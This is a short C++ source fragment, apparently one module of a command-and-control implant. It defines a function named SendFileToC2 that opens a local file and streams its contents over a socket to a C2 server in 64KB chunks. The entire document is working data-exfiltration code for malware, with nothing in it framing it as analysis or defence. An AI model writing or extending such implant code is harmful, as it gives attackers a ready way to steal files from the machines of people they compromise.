// Add this to file_download.cpp or create new file: file_upload.cpp

BOOL SendFileToC2(SOCKET sock, const char* filePath) {
    // Open local file
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Cannot open file: %s (Error: %lu)\n", filePath, GetLastError());
        return FALSE;
    }
    
    // Get file size
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("[!] Cannot get file size\n");
        CloseHandle(hFile);
        return FALSE;
    }
    
    // Send file size first (4 bytes, network byte order)
    uint32_t netSize = htonl(fileSize);
    if (send(sock, (char*)&netSize, sizeof(netSize), 0) != sizeof(netSize)) {
        printf("[!] Failed to send file size\n");
        CloseHandle(hFile);
        return FALSE;
    }
    
    // Read and send chunks
    char buffer[65536]; // 64KB chunks
    DWORD bytesRead = 0;
    DWORD totalSent = 0;
    
    while (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        DWORD bytesSent = 0;
        while (bytesSent < bytesRead) {
            int sent = send(sock, buffer + bytesSent, bytesRead - bytesSent, 0);
            if (sent <= 0) {
                printf("[!] Send failed at %lu/%lu bytes\n", totalSent, fileSize);
                CloseHandle(hFile);
                return FALSE;
            }
            bytesSent += sent;
        }
        totalSent += bytesSent;
        printf("\r[+] Upload progress: %.1f%%", (totalSent * 100.0) / fileSize);
    }
    
    printf("\n[+] File uploaded: %s (%lu bytes)\n", filePath, fileSize);
    CloseHandle(hFile);
    return TRUE;
}